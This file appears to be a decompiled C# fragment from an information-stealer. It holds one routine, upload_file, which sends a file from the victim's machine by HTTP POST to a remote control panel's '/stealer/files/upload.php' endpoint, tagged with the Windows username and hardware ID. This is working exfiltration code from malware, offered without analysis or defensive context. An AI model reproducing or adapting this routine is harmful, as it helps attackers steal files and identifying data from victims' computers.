using System;
using System.Net;

// Token: 0x02000003 RID: 3
internal static class Internet
{
	// Token: 0x06000001 RID: 1
	public static void upload_file(string string_0)
	{
		try
		{
			new WebClient().UploadFile(Class2.link_to_panel + string.Format("/stealer/files/upload.php?user={0}&hwid={1}", Class2.windows_username, Class2.hwid), "POST", string_0);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.ToString());
		}
	}
}
